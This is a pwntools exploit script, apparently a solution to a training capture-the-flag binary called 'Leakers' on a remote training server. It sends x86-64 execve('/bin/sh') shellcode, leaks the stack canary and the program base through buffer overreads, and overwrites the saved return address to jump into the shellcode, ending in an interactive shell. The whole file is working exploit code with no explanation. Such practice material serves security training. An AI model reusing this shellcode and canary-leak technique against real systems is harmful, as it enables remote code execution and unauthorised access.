from pwn import *
import time

context.terminal = ['tmux','splitw','-h']

#r = process("./leakers")
r = remote("bin.training.jinblack.it", 2012)
#gdb.attach(r, gdbscript="""
 #   brva 0xa45
  #  c
   #""")
       
#input("wait")
r.recvuntil(b"Welcome to Leakers!\n")
shellcode = b"\xEB\x0E\x48\x31\xC0\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05\xE8\xED\xFF\xFF\xFF/bin/sh\x00"

r.send(shellcode)
time.sleep(1)
r.send(b"A"*105)

time.sleep(1)
r.recvuntil(b"> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("canary: %#x" % canary)
r.send(b"A"*(104+8*1))
time.sleep(1)
r.recvuntil(b"> ")
r.recv(104+8*1)
main = u64(r.recv(6) + b"\x00\x00" )
main = main - 0xac0
bss = main + 0x201080 # ps1 position in .bss
print("main: %#x" % main)
print("bss: %#x" % bss)
r.send(b"A"*104 + p64(canary) + b"D"*8 + p64(bss))
time.sleep(1)
r.send(b"\n")
time.sleep(1)
#payload = shellcode.ljust(104, b"\x90") + p64(canary) + b"D"*8 + p64(stack)
#r.send(payload)
#time.sleep(1)
#r.send(b"\n")
r.interactive()